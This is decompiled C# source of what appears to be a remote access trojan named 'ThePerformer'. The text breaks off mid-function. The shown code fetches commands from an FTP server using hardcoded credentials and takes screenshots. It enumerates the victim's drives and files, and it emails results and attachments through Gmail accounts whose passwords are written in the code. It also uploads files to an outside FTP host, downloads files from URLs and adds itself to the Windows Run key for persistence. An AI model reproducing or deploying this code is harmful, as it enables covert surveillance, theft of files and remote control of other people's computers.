using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Printing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using SpeechLib;

namespace ThePeformer;

public class Form1 : Form
{
	private class EjectMedia
	{
		private const uint GENERICREAD = 2147483648u;

		private const uint OPENEXISTING = 3u;

		private const uint IOCTL_STORAGE_EJECT_MEDIA = 2967560u;

		private const int INVALID_HANDLE = -1;

		private static IntPtr fileHandle;

		private static uint returnedBytes;

		[DllImport("kernel32", SetLastError = true)]
		private static extern IntPtr CreateFile(string fileName, uint desiredAccess, uint shareMode, IntPtr attributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);

		[DllImport("kernel32", SetLastError = true)]
		private static extern int CloseHandle(IntPtr driveHandle);

		[DllImport("kernel32", SetLastError = true)]
		private static extern bool DeviceIoControl(IntPtr driveHandle, uint IoControlCode, IntPtr lpInBuffer, uint inBufferSize, IntPtr lpOutBuffer, uint outBufferSize, ref uint lpBytesReturned, IntPtr lpOverlapped);

		public static void Eject(string driveLetter)
		{
			try
			{
				fileHandle = CreateFile(driveLetter, 2147483648u, 0u, IntPtr.Zero, 3u, 0u, IntPtr.Zero);
				if ((int)fileHandle != -1)
				{
					DeviceIoControl(fileHandle, 2967560u, IntPtr.Zero, 0u, IntPtr.Zero, 0u, ref returnedBytes, IntPtr.Zero);
				}
			}
			catch
			{
				throw new Exception(Marshal.GetLastWin32Error().ToString());
			}
			finally
			{
				CloseHandle(fileHandle);
				fileHandle = IntPtr.Zero;
			}
		}
	}

	private static class FileHelper
	{
		public static List<string> GetFilesRecursive(string b)
		{
			List<string> list = new List<string>();
			Stack<string> stack = new Stack<string>();
			stack.Push(b);
			while (stack.Count > 0)
			{
				string path = stack.Pop();
				try
				{
					list.AddRange(Directory.GetFiles(path, "*.*"));
					string[] directories = Directory.GetDirectories(path);
					foreach (string item in directories)
					{
						stack.Push(item);
					}
				}
				catch
				{
				}
			}
			return list;
		}

		public static List<string> GetFilesRecursive(string b, string extension)
		{
			extension = "*." + extension;
			List<string> list = new List<string>();
			Stack<string> stack = new Stack<string>();
			stack.Push(b);
			while (stack.Count > 0)
			{
				string path = stack.Pop();
				try
				{
					list.AddRange(Directory.GetFiles(path, extension));
					string[] directories = Directory.GetDirectories(path);
					foreach (string item in directories)
					{
						stack.Push(item);
					}
				}
				catch
				{
				}
			}
			return list;
		}
	}

	internal class API
	{
		[DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetDC(IntPtr hWnd);

		[DllImport("user32.dll", ExactSpelling = true)]
		public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);

		[DllImport("gdi32.dll", ExactSpelling = true)]
		public static extern IntPtr BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);

		[DllImport("user32.dll")]
		public static extern IntPtr GetDesktopWindow();
	}

	internal class ScreenShot
	{
		public static Bitmap take()
		{
			//IL_002b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0031: Expected O, but got Unknown
			int width = Screen.get_PrimaryScreen().get_Bounds().Width;
			int height = Screen.get_PrimaryScreen().get_Bounds().Height;
			Bitmap val = new Bitmap(width, height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			IntPtr dC = API.GetDC(API.GetDesktopWindow());
			IntPtr hdc = val2.GetHdc();
			API.BitBlt(hdc, 0, 0, width, height, dC, 0, 0, 13369376);
			API.ReleaseDC(API.GetDesktopWindow(), dC);
			val2.ReleaseHdc(hdc);
			val2.Dispose();
			return val;
		}
	}

	private Font printFont;

	private StreamReader streamToPrint;

	private string previousCommand = "";

	private string CatchTheFile;

	private StreamReader reader;

	private StreamWriter writer;

	private string MyID = "0";

	private byte[] downloadedData;

	private string username = "fakhr245";

	private string password = "warsakooo";

	private string FTPAddress = "ftp://kingfakhr.somee.com/";

	private string filename = ".txt";

	private string CommandParameter_1 = "";

	private string CommandParameter_2 = "";

	private string CommandParameter_3 = "";

	private int CommandNumber;

	private int Time = 0;

	private bool ServerFileAvailable = false;

	private bool continueWork = false;

	private bool Continue = false;

	private int Time_Last_Msg_Sent = 0;

	private int Auto_Msg_Count = 0;

	private bool StartCommanding = false;

	private int timeToProcess = 10;

	private string[] MultiCommands = new string[20];

	private int soundRecordingTime = 10;

	private int timer_2_progress = 0;

	private bool voiceRecording = false;

	private IContainer components = null;

	private Button button1;

	private Button button2;

	private SaveFileDialog saveFileDialog1;

	private ProgressBar progressBar1;

	private Label lbProgress;

	private Timer timer1;

	private PictureBox pictureBox1;

	private RichTextBox richTextBox1;

	private Label label1;

	private Label label2;

	private Button button3;

	private Timer timer2;

	public Form1()
	{
		InitializeComponent();
	}

	private void pd_PrintPage(object sender, PrintPageEventArgs ev)
	{
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		float num = 0f;
		float num2 = 0f;
		int i = 0;
		float num3 = ev.get_MarginBounds().Left;
		float num4 = ev.get_MarginBounds().Top;
		string text = null;
		for (num = (float)ev.get_MarginBounds().Height / printFont.GetHeight(ev.get_Graphics()); (float)i < num; i++)
		{
			if ((text = streamToPrint.ReadLine()) == null)
			{
				break;
			}
			num2 = num4 + (float)i * printFont.GetHeight(ev.get_Graphics());
			ev.get_Graphics().DrawString(text, printFont, Brushes.get_Black(), num3, num2, new StringFormat());
		}
		if (text != null)
		{
			ev.set_HasMorePages(true);
		}
		else
		{
			ev.set_HasMorePages(false);
		}
	}

	[DllImport("user32.dll")]
	public static extern void SetForegroundWindow(IntPtr handle);

	[DllImport("user32.dll")]
	public static extern void SetBackgroundWindow(IntPtr handle);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mciSendStringA", ExactSpelling = true, SetLastError = true)]
	private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

	private void DownloadFile()
	{
		downloadedData = new byte[0];
		try
		{
			Application.DoEvents();
			FtpWebRequest ftpWebRequest = WebRequest.Create(FTPAddress + "MyCodes/" + MyID + filename) as FtpWebRequest;
			Application.DoEvents();
			ftpWebRequest.Method = "SIZE";
			ftpWebRequest.Credentials = new NetworkCredential(username, password);
			ftpWebRequest.UsePassive = true;
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.KeepAlive = true;
			int maximum = (int)ftpWebRequest.GetResponse().ContentLength;
			Application.DoEvents();
			ftpWebRequest = WebRequest.Create(FTPAddress + "MyCodes/" + MyID + filename) as FtpWebRequest;
			ftpWebRequest.Method = "RETR";
			ftpWebRequest.Credentials = new NetworkCredential(username, password);
			ftpWebRequest.UsePassive = true;
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.KeepAlive = false;
			progressBar1.set_Value(0);
			progressBar1.set_Maximum(maximum);
			((Control)lbProgress).set_Text("0/" + maximum);
			FtpWebResponse ftpWebResponse = ftpWebRequest.GetResponse() as FtpWebResponse;
			Stream responseStream = ftpWebResponse.GetResponseStream();
			MemoryStream memoryStream = new MemoryStream();
			byte[] array = new byte[1024];
			while (true)
			{
				bool flag = true;
				Application.DoEvents();
				int num = responseStream.Read(array, 0, array.Length);
				if (num == 0)
				{
					break;
				}
				memoryStream.Write(array, 0, num);
				if (progressBar1.get_Value() + num <= progressBar1.get_Maximum())
				{
					ProgressBar obj = progressBar1;
					obj.set_Value(obj.get_Value() + num);
					((Control)lbProgress).set_Text(progressBar1.get_Value() + "/" + maximum);
					((Control)progressBar1).Refresh();
					Application.DoEvents();
				}
			}
			progressBar1.set_Value(progressBar1.get_Maximum());
			((Control)lbProgress).set_Text(maximum + "/" + maximum);
			Application.DoEvents();
			downloadedData = memoryStream.ToArray();
			responseStream.Close();
			memoryStream.Close();
			ftpWebResponse.Close();
			ServerFileAvailable = true;
		}
		catch (Exception)
		{
			ServerFileAvailable = false;
		}
	}

	private void DownloadFile(string FileName)
	{
		timer1.set_Enabled(false);
		downloadedData = new byte[0];
		try
		{
			Application.DoEvents();
			FtpWebRequest ftpWebRequest = WebRequest.Create(FTPAddress + FileName) as FtpWebRequest;
			Application.DoEvents();
			ftpWebRequest.Method = "SIZE";
			ftpWebRequest.Credentials = new NetworkCredential(username, password);
			ftpWebRequest.UsePassive = true;
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.KeepAlive = true;
			int maximum = (int)ftpWebRequest.GetResponse().ContentLength;
			Application.DoEvents();
			ftpWebRequest = WebRequest.Create(FTPAddress + FileName) as FtpWebRequest;
			ftpWebRequest.Method = "RETR";
			ftpWebRequest.Credentials = new NetworkCredential(username, password);
			ftpWebRequest.UsePassive = true;
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.KeepAlive = false;
			progressBar1.set_Value(0);
			progressBar1.set_Maximum(maximum);
			((Control)lbProgress).set_Text("0/" + maximum);
			FtpWebResponse ftpWebResponse = ftpWebRequest.GetResponse() as FtpWebResponse;
			Stream responseStream = ftpWebResponse.GetResponseStream();
			MemoryStream memoryStream = new MemoryStream();
			byte[] array = new byte[1024];
			while (true)
			{
				bool flag = true;
				Application.DoEvents();
				int num = responseStream.Read(array, 0, array.Length);
				if (num == 0)
				{
					break;
				}
				memoryStream.Write(array, 0, num);
				if (progressBar1.get_Value() + num <= progressBar1.get_Maximum())
				{
					ProgressBar obj = progressBar1;
					obj.set_Value(obj.get_Value() + num);
					((Control)lbProgress).set_Text(progressBar1.get_Value() + "/" + maximum);
					((Control)progressBar1).Refresh();
					Application.DoEvents();
				}
			}
			progressBar1.set_Value(progressBar1.get_Maximum());
			((Control)lbProgress).set_Text(maximum + "/" + maximum);
			Application.DoEvents();
			downloadedData = memoryStream.ToArray();
			responseStream.Close();
			memoryStream.Close();
			ftpWebResponse.Close();
			ServerFileAvailable = true;
		}
		catch (Exception)
		{
			ServerFileAvailable = false;
		}
		try
		{
			File.Delete(Application.get_StartupPath() + "\\fakhr.txt");
			timer1.set_Enabled(true);
		}
		catch
		{
			File.Delete(Application.get_StartupPath() + "\\fakhr.txt");
			timer1.set_Enabled(true);
		}
		finally
		{
		}
		timer1.set_Enabled(true);
	}

	private void sendMailToMe(string BodyText, string fileUrl)
	{
		MailAddress mailAddress = new MailAddress("khansmart42@gmail.com", Environment.MachineName);
		MailAddress mailAddress2 = new MailAddress("fakhr245@gmail.com", "king");
		string subject = Environment.MachineName + DateTime.Now;
		if (CommandParameter_1 != "")
		{
			subject = MyID;
		}
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.Port = 587;
		smtpClient.EnableSsl = true;
		smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
		smtpClient.UseDefaultCredentials = false;
		smtpClient.Credentials = new NetworkCredential(mailAddress.Address, "tsmart440");
		SmtpClient smtpClient2 = smtpClient;
		MailMessage mailMessage = new MailMessage(mailAddress.Address, mailAddress2.Address);
		mailMessage.Subject = subject;
		mailMessage.Body = BodyText;
		if (fileUrl != "")
		{
			Attachment item = new Attachment(fileUrl);
			mailMessage.Attachments.Add(item);
		}
		try
		{
			smtpClient2.Send(mailMessage);
		}
		catch (Exception)
		{
		}
		try
		{
			File.Delete(Application.get_StartupPath() + "\\" + MyID + filename);
			timer1.set_Enabled(true);
		}
		catch
		{
			File.Delete(Application.get_StartupPath() + "\\" + MyID + filename);
			timer1.set_Enabled(true);
		}
		finally
		{
		}
	}

	private void sendMailToMe(string BodyText, string fileUrls, int nfiles)
	{
		MailAddress mailAddress = new MailAddress("lastlastangel@gmail.com", Environment.MachineName);
		MailAddress mailAddress2 = new MailAddress("fakhr245@gmail.com", "king");
		string subject = Environment.MachineName + DateTime.Now;
		if (CommandParameter_1 != "")
		{
			subject = MyID;
		}
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.Port = 587;
		smtpClient.EnableSsl = true;
		smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
		smtpClient.UseDefaultCredentials = false;
		smtpClient.Credentials = new NetworkCredential(mailAddress.Address, "sleazydream");
		SmtpClient smtpClient2 = smtpClient;
		MailMessage mailMessage = new MailMessage(mailAddress.Address, mailAddress2.Address);
		mailMessage.Subject = subject;
		mailMessage.Body = BodyText;
		if (fileUrls != "")
		{
			Attachment item = new Attachment(fileUrls);
			mailMessage.Attachments.Add(item);
		}
		try
		{
			smtpClient2.Send(mailMessage);
		}
		catch (Exception)
		{
		}
		try
		{
			File.Delete(Application.get_StartupPath() + "\\" + MyID + filename);
			timer1.set_Enabled(true);
		}
		catch
		{
			File.Delete(Application.get_StartupPath() + "\\" + MyID + filename);
			timer1.set_Enabled(true);
		}
		finally
		{
		}
	}

	private void UploadFile(string Filename)
	{
		try
		{
			string requestUriString = "ftp://FTP.DriveHQ.com/MyCodes/" + Path.GetFileName(Filename);
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(requestUriString);
			ftpWebRequest.Credentials = new NetworkCredential(username, password);
			ftpWebRequest.KeepAlive = true;
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.Method = "STOR";
			FileStream fileStream = File.OpenRead(Filename);
			byte[] array = new byte[fileStream.Length];
			fileStream.Read(array, 0, array.Length);
			fileStream.Close();
			Stream requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
		}
		catch (Exception)
		{
		}
		try
		{
			File.Delete(Application.get_StartupPath() + "\\" + MyID + filename);
			timer1.set_Enabled(true);
		}
		catch
		{
			File.Delete(Application.get_StartupPath() + "\\" + MyID + filename);
			timer1.set_Enabled(true);
		}
		finally
		{
		}
	}

	private void WorkingStatus()
	{
		try
		{
			reader = new StreamReader(Application.get_StartupPath() + "\\" + MyID + filename);
			string text = reader.ReadLine();
			string text2 = reader.ReadToEnd();
			if (text2.IndexOf('*') == 0)
			{
				continueWork = true;
			}
			else
			{
				continueWork = false;
			}
			reader.Close();
		}
		catch
		{
			continueWork = false;
		}
	}

	private string ReadFile_For_New_Command()
	{
		try
		{
			reader = new StreamReader(Application.get_StartupPath() + "\\" + MyID + filename);
			string result = reader.ReadToEnd();
			reader.Close();
			return result;
		}
		catch
		{
			return "";
		}
	}

	private string ReadFile()
	{
		try
		{
			reader = new StreamReader(Application.get_StartupPath() + "\\" + MyID + filename);
			string result = reader.ReadLine();
			reader.Close();
			return result;
		}
		catch
		{
			return "";
		}
	}

	private void ProcessCommand(string TheCommand)
	{
		switch (TheCommand.IndexOf(','))
		{
		case 1:
		{
			CommandNumber = int.Parse(TheCommand[0].ToString());
			((Control)label1).set_Text("Last Command = " + CommandNumber);
			int num = 0;
			if (TheCommand.Length <= 2)
			{
				break;
			}
			try
			{
				int num2 = TheCommand.IndexOf(',');
				int num3 = TheCommand.IndexOf(',', num2 + 1);
				num = TheCommand.LastIndexOf(',');
				if (num3 != -1)
				{
					int length = num3 - 1 - num2;
					CommandParameter_1 = TheCommand.Substring(2, length);
					if (num != num3)
					{
						int length2 = num - 1 - num3;
						CommandParameter_2 = TheCommand.Substring(num3 + 1, length2);
						int length3 = TheCommand.Length - num - 1;
						CommandParameter_3 = TheCommand.Substring(num + 1, length3);
					}
					else
					{
						int length2 = TheCommand.Length - num3 - 1;
						CommandParameter_2 = TheCommand.Substring(num3 + 1, length2);
					}
				}
				else
				{
					CommandParameter_1 = TheCommand.Substring(2, TheCommand.Length - 2);
				}
			}
			catch
			{
			}
			break;
		}
		case 2:
		{
			string text = TheCommand[0].ToString();
			string text2 = TheCommand[1].ToString();
			string s = text + text2;
			CommandNumber = int.Parse(s);
			((Control)label1).set_Text("Last Command = " + CommandNumber);
			int num = 0;
			if (TheCommand.Length <= 3)
			{
				break;
			}
			try
			{
				int num2 = TheCommand.IndexOf(',');
				int num3 = TheCommand.IndexOf(',', num2 + 1);
				num = TheCommand.LastIndexOf(',');
				if (num3 != -1)
				{
					int length = num3 - 1 - num2;
					CommandParameter_1 = TheCommand.Substring(3, length);
					if (num != num3)
					{
						int length2 = num - 1 - num3;
						CommandParameter_2 = TheCommand.Substring(num3 + 1, length2);
						int length3 = TheCommand.Length - num - 1;
						CommandParameter_3 = TheCommand.Substring(num + 1, length3);
					}
					else
					{
						int length2 = TheCommand.Length - num3 - 1;
						CommandParameter_2 = TheCommand.Substring(num3 + 1, length2);
					}
				}
				else
				{
					CommandParameter_1 = TheCommand.Substring(3, TheCommand.Length - 3);
				}
			}
			catch
			{
			}
			break;
		}
		default:
			try
			{
				string text = TheCommand[0].ToString();
				string text2 = TheCommand[1].ToString();
				string s = text + text2;
				CommandNumber = int.Parse(s);
				((Control)label1).set_Text("Last Command = " + CommandNumber);
			}
			catch
			{
				CommandNumber = int.Parse(TheCommand[0].ToString());
				((Control)label1).set_Text("Last Command = " + CommandNumber);
			}
			break;
		}
		((Control)label1).set_Text("Last Command = " + CommandNumber + "\nParameter_1 = " + CommandParameter_1 + "\nParameter_2 = " + CommandParameter_2 + "\nParameter_3 = " + CommandParameter_3);
		try
		{
			CommandParameter_1 = RemoveStar(CommandParameter_1);
			CommandParameter_2 = RemoveStar(CommandParameter_2);
			CommandParameter_3 = RemoveStar(CommandParameter_3);
		}
		catch
		{
		}
	}

	private void ProcessCommand()
	{
		string text = ReadFile();
		switch (text.IndexOf(','))
		{
		case 1:
		{
			CommandNumber = int.Parse(text[0].ToString());
			((Control)label1).set_Text("Last Command = " + CommandNumber);
			int num = 0;
			if (text.Length <= 2)
			{
				break;
			}
			try
			{
				int num2 = text.IndexOf(',');
				int num3 = text.IndexOf(',', num2 + 1);
				num = text.LastIndexOf(',');
				if (num3 != -1)
				{
					int length = num3 - 1 - num2;
					CommandParameter_1 = text.Substring(2, length);
					if (num != num3)
					{
						int length2 = num - 1 - num3;
						CommandParameter_2 = text.Substring(num3 + 1, length2);
						int length3 = text.Length - num - 1;
						CommandParameter_3 = text.Substring(num + 1, length3);
					}
					else
					{
						int length2 = text.Length - num3 - 1;
						CommandParameter_2 = text.Substring(num3 + 1, length2);
					}
				}
				else
				{
					CommandParameter_1 = text.Substring(2, text.Length - 2);
				}
			}
			catch
			{
			}
			break;
		}
		case 2:
		{
			string text2 = text[0].ToString();
			string text3 = text[1].ToString();
			string s = text2 + text3;
			CommandNumber = int.Parse(s);
			((Control)label1).set_Text("Last Command = " + CommandNumber);
			int num = 0;
			if (text.Length <= 3)
			{
				break;
			}
			try
			{
				int num2 = text.IndexOf(',');
				int num3 = text.IndexOf(',', num2 + 1);
				num = text.LastIndexOf(',');
				if (num3 != -1)
				{
					int length = num3 - 1 - num2;
					CommandParameter_1 = text.Substring(3, length);
					if (num != num3)
					{
						int length2 = num - 1 - num3;
						CommandParameter_2 = text.Substring(num3 + 1, length2);
						int length3 = text.Length - num - 1;
						CommandParameter_3 = text.Substring(num + 1, length3);
					}
					else
					{
						int length2 = text.Length - num3 - 1;
						CommandParameter_2 = text.Substring(num3 + 1, length2);
					}
				}
				else
				{
					CommandParameter_1 = text.Substring(3, text.Length - 3);
				}
			}
			catch
			{
			}
			break;
		}
		default:
			try
			{
				string text2 = text[0].ToString();
				string text3 = text[1].ToString();
				string s = text2 + text3;
				CommandNumber = int.Parse(s);
				((Control)label1).set_Text("Last Command = " + CommandNumber);
			}
			catch
			{
				CommandNumber = int.Parse(text[0].ToString());
				((Control)label1).set_Text("Last Command = " + CommandNumber);
			}
			break;
		}
		((Control)label1).set_Text("Last Command = " + CommandNumber + "\nParameter_1 = " + CommandParameter_1 + "\nParameter_2 = " + CommandParameter_2 + "\nParameter_3 = " + CommandParameter_3);
		try
		{
			CommandParameter_1 = RemoveStar(CommandParameter_1);
			CommandParameter_2 = RemoveStar(CommandParameter_2);
			CommandParameter_3 = RemoveStar(CommandParameter_3);
		}
		catch
		{
		}
	}

	private string RemoveStar(string commandParameter)
	{
		int startIndex = commandParameter.LastIndexOf('*');
		commandParameter = commandParameter.Remove(startIndex, 1);
		return commandParameter;
	}

	private string ReadFile(string FileName)
	{
		string text = "";
		try
		{
			reader = new StreamReader(FileName);
			text = reader.ReadLine();
			reader.Close();
		}
		catch
		{
			text = "";
		}
		return text;
	}

	private int NoDrives()
	{
		return Directory.GetLogicalDrives().Count();
	}

	private string[] DrivesName()
	{
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = new string[10];
		for (int i = 0; i <= logicalDrives.Length - 1; i++)
		{
			try
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				string text = driveInfo.DriveType.ToString();
				array[i] = driveInfo.ToString() + " Type: " + text;
			}
			catch
			{
				return array;
			}
		}
		return array;
	}

	private int NoDirectories(string path)
	{
		return Directory.GetDirectories(path).Count();
	}

	private string[] DirectoriesName(string path)
	{
		return Directory.GetDirectories(path);
	}

	private int NoFiles(string path)
	{
		return Directory.GetFiles(path).Count();
	}

	private string[] FilesName(string path)
	{
		return Directory.GetFiles(path);
	}

	private string[] FilesName(string path, string extension)
	{
		return Directory.GetFiles(path, extension);
	}

	private void WriteData(string heading, string[] data)
	{
		try
		{
			int i = 0;
			CatchTheFile += "\n..............\n\n";
			for (; i <= data.Length - 1; i++)
			{
				CatchTheFile = CatchTheFile + data[i] + "\n";
			}
		}
		catch
		{
		}
	}

	private void WriteData(string heading, string data)
	{
		try
		{
			CatchTheFile = heading + "\n\n" + data;
		}
		catch
		{
		}
	}

	private void WriteData(string heading, string data, string FileName)
	{
		try
		{
			CatchTheFile = heading + "\n\n" + data;
		}
		catch (Exception)
		{
		}
	}

	private void DeleteServerFile()
	{
		try
		{
			if (ServerFileAvailable)
			{
				Uri requestUri = new Uri(FTPAddress + "MyCodes/" + MyID + filename);
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(requestUri);
				ftpWebRequest.Method = "DELE";
				ftpWebRequest.Credentials = new NetworkCredential(username, password);
				FtpWebResponse ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse();
				ftpWebResponse.Close();
			}
			ServerFileAvailable = false;
		}
		catch
		{
			ServerFileAvailable = false;
		}
	}

	private void DeleteServerFile(string address)
	{
		try
		{
			if (ServerFileAvailable)
			{
				Uri requestUri = new Uri(address);
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(requestUri);
				ftpWebRequest.Method = "DELE";
				ftpWebRequest.Credentials = new NetworkCredential(username, password);
				FtpWebResponse ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse();
				ftpWebResponse.Close();
			}
			ServerFileAvailable = false;
		}
		catch
		{
		}
	}

	private void SaveServerFile()
	{
		if (!ServerFileAvailable)
		{
			return;
		}
		try
		{
			if (downloadedData != null && downloadedData.Length != 0)
			{
				Application.DoEvents();
				FileStream fileStream = new FileStream(Application.get_StartupPath() + "\\" + MyID + filename, FileMode.Create);
				fileStream.Write(downloadedData, 0, downloadedData.Length);
				fileStream.Close();
			}
		}
		catch
		{
			try
			{
				File.Delete(Application.get_StartupPath() + "\\" + MyID + filename);
			}
			catch
			{
			}
			if (downloadedData != null && downloadedData.Length != 0)
			{
				Application.DoEvents();
				FileStream fileStream = new FileStream(Application.get_StartupPath() + "\\" + MyID + filename, FileMode.Create);
				fileStream.Write(downloadedData, 0, downloadedData.Length);
				fileStream.Close();
			}
		}
	}

	private void SaveServerFile(string myFileName)
	{
		if (!ServerFileAvailable)
		{
			return;
		}
		try
		{
			if (downloadedData != null && downloadedData.Length != 0)
			{
				Application.DoEvents();
				FileStream fileStream = new FileStream(Application.get_StartupPath() + "\\" + myFileName, FileMode.Create);
				fileStream.Write(downloadedData, 0, downloadedData.Length);
				fileStream.Close();
			}
		}
		catch
		{
			try
			{
				File.Delete(Application.get_StartupPath() + "\\" + myFileName);
			}
			catch
			{
			}
			if (downloadedData != null && downloadedData.Length != 0)
			{
				Application.DoEvents();
				FileStream fileStream = new FileStream(Application.get_StartupPath() + "\\" + myFileName, FileMode.Create);
				fileStream.Write(downloadedData, 0, downloadedData.Length);
				fileStream.Close();
			}
		}
	}

	private void DeleteLocalFile(string FileName)
	{
		try
		{
			File.Delete(FileName);
		}
		catch
		{
		}
	}

	private string MyFileSize(string FilePath)
	{
		string result = "File Name: " + FilePath + " Size: Cannot Calculated";
		try
		{
			FileInfo fileInfo = new FileInfo(FilePath);
			double num = fileInfo.Length;
			string text = "Bytes";
			if (num <= 1024.0)
			{
				num = fileInfo.Length;
			}
			else if (num <= 1048576.0)
			{
				num = (double)fileInfo.Length / 1024.0;
				text = "KB";
			}
			else if (num <= 1073741824.0)
			{
				num = (double)fileInfo.Length / 1048576.0;
				text = "MB";
			}
			else
			{
				num = (double)fileInfo.Length / 1073741824.0;
				text = "GB";
			}
			string text2 = num.ToString();
			if (text2.IndexOf('.') != -1)
			{
				try
				{
					text2 = text2.Substring(0, text2.IndexOf('.') + 3);
				}
				catch
				{
					text2 = text2.Substring(0, text2.IndexOf('.') + 2);
				}
			}
			result = "File Name: " + FilePath + " Size: " + text2 + text;
		}
		catch
		{
		}
		return result;
	}

	public static double DirSize(DirectoryInfo d)
	{
		double num = 0.0;
		try
		{
			FileInfo[] files = d.GetFiles();
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				num += (double)fileInfo.Length;
			}
			DirectoryInfo[] directories = d.GetDirectories();
			DirectoryInfo[] array2 = directories;
			foreach (DirectoryInfo d2 in array2)
			{
				num += DirSize(d2);
			}
		}
		catch
		{
		}
		return num;
	}

	private string MyFolderSize(string FolderPath)
	{
		string result = "Folder Name: " + FolderPath + " Size: Cannot Calculated";
		try
		{
			DirectoryInfo d = new DirectoryInfo(FolderPath);
			double num = DirSize(d);
			string text = "Bytes";
			if (num <= 1024.0)
			{
				num = num;
			}
			else if (num <= 1048576.0)
			{
				num /= 1024.0;
				text = "KB";
			}
			else if (num <= 1073741824.0)
			{
				num /= 1048576.0;
				text = "MB";
			}
			else
			{
				num /= 1073741824.0;
				text = "GB";
			}
			string text2 = num.ToString();
			if (text2.IndexOf('.') != -1)
			{
				try
				{
					text2 = text2.Substring(0, text2.IndexOf('.') + 3);
				}
				catch
				{
					text2 = text2.Substring(0, text2.IndexOf('.') + 2);
				}
			}
			result = "Fodler Name: " + FolderPath + " Size: " + text2 + text;
		}
		catch
		{
		}
		return result;
	}

	private void CreateRegistry()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("ThePerformer", Application.get_ExecutablePath().ToString());
		}
		catch
		{
		}
	}

	private void CreateRegistry(string path)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("ThePerformer", path);
		}
		catch
		{
		}
	}

	private bool CheckRegistry()
	{
		bool result = false;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			result = registryKey.GetValue("ThePerformer") != null;
		}
		catch
		{
		}
		return result;
	}

	private void DeleteRegistry(string program)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.DeleteValue(program, throwOnMissingValue: false);
		}
		catch
		{
		}
	}

	private void MoveFileTo(string prePAth, string newPath)
	{
		try
		{
			File.Move(prePAth, newPath);
		}
		catch
		{
		}
	}

	private void GetPicture()
	{
		try
		{
			pictureBox1.set_Image((Image)(object)ScreenShot.take());
			pictureBox1.get_Image().Save(Application.get_StartupPath() + "\\" + MyID + "Pic.jpeg");
		}
		catch
		{
		}
	}

	private void DownloadHTTPFile(string url)
	{
		ServerFileAvailable = false;
		timer1.set_Enabled(false);
		progressBar1.set_Value(0);
		downloadedData = new byte[0];
		try
		{
			Application.DoEvents();
			WebRequest webRequest = WebRequest.Create(url);
			WebResponse response = webRequest.GetResponse();
			Stream responseStream = response.GetResponseStream();
			byte[] array = new byte[1024];
			int maximum = (int)response.ContentLength;
			progressBar1.set_Maximum(maximum);
			((Control)lbProgress).set_Text("0/" + maximum);
			Application.DoEvents();
			MemoryStream memoryStream = new MemoryStream();
			while (true)
			{
				bool flag = true;
				int num = responseStream.Read(array, 0, array.Length);
				if (num == 0)
				{
					break;
				}
				memoryStream.Write(array, 0, num);
				if (progressBar1.get_Value() + num <= progressBar1.get_Maximum())
				{
					ProgressBar obj = progressBar1;
					obj.set_Value(obj.get_Value() + num);
					((Control)lbProgress).set_Text(progressBar1.get_Value() + "/" + maximum);
					((Control)progressBar1).Refresh();
					Application.DoEvents();
				}
			}
			progressBar1.set_Value(progressBar1.get_Maximum());
			((Control)lbProgress).set_Text(maximum + "/" + maximum);
			Application.DoEvents();
			downloadedData = memoryStream.ToArray();
			responseStream.Close();
			memoryStream.Close();
			ServerFileAvailable = true;
		}
		catch (Exception)
		{
		}
		((Control)lbProgress).set_Text(downloadedData.Length.ToString());
		timer1.set_Enabled(true);
	}

	private void SaveHTTPFile(string DFileName)
	{
		timer1.set_Enabled(false);
		if (downloadedData != null && downloadedData.Length != 0)
		{
			Application.DoEvents();
			FileStream fileStream = new FileStream(Application.get_StartupPath() + "\\" + DFileName, FileMode.Create);
			fileStream.Write(downloadedData, 0, downloadedData.Length);
			fileStream.Close();
		}
		timer1.set_Enabled(true);
	}

	private void SaveHTTPFile()
	{
		timer1.set_Enabled(false);
		if (downloadedData != null && downloadedData.Length != 0)
		{
			string text = CommandParameter_1;
			if (text.EndsWith("/"))
			{
				text = text.Substring(0, text.Length - 1);
			}
